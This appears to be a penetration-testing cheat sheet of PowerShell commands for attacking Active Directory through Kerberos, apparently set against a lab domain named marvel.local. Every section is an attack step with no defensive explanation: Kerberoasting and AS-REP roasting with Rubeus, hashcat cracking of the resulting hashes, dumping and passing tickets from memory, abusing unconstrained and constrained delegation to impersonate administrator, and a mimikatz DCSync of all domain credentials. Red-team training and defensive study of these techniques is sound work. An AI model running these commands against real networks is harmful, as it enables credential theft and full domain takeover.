## Kerberoasting

### Generate TGS Ticket For Every SPN
```powershell
Rubeus.exe kerberoast /nowrap
Rubeus.exe kerberoast /user:sqlservice /nowrap
```

### Cracking
```powershell
hashcat.exe -a 0 -m 13100 hashes.txt wordlist.txt
```

## ASREP-Roasting (Kerberos PreAuth)

### Check for users who don't have kerberos preauthentication set
```powershell
Get-DomainUser -PreauthNotRequired
```

### Request TGT Ticket For All The Vulnerable Users
```powershell
Rubeus.exe asreproast /nowrap
Rubeus.exe asreproast /user:user5 /nowrap
```

### Cracking
```powershell
hashcat.exe -a 0 -m 18200 hashes.txt wordlist.txt
```

## Unconstrained Delegation

### Enumerate all servers that allow unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained | select dnshostname,operatingsystem,pwdlastset
```

### Dump Domain Users TGT From Memory
```powershell
Rubeus.exe triage
Rubeus.exe dump /nowrap
Rubeus.exe dump /user:Administrator /nowrap
Rubeus.exe ptt /ticket:<TICKET-Base64>
```

### Rubeus Monitoring
```powershell
Rubeus.exe monitor /targetuser:nlamb /interval:5 /nowrap
```

## Constrained Delegation

### Find any users/computers with constrained delegation
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto
```

### Dump Computer account TGT From Memory
```powershell
Rubeus.exe triage
Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

### Request a TGS for another admin user with the computer account TGT
```powershell
Rubeus.exe s4u /impersonateuser:administrator /msdsspn:cifs/hydra-dc.marvel.local /user:machine-x$ /ticket:<TICKET-Base64> /nowrap /ptt
```

### Request a TGS for any other service also with the computer account TGT
```powershell
Rubeus.exe s4u /impersonateuser:administrator /msdsspn:cifs/hydra-dc.marvel.local /user:machine-x$ /ticket:<TICKET-Base64> /nowrap /ptt /altservice:ldap
```

### DCSync using LDAP
```powershell
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:marvel.local /all /csv" exit
```

### S4U2Self Abuse (access any service if we have computer TGT)
```powershell
Rubeus.exe s4u /impersonateuser:administrator /altservice:cifs/machine-x.marvel.local /self /user:machine-x$ /ticket:<TICKET-Base64> /nowrap /ptt
```
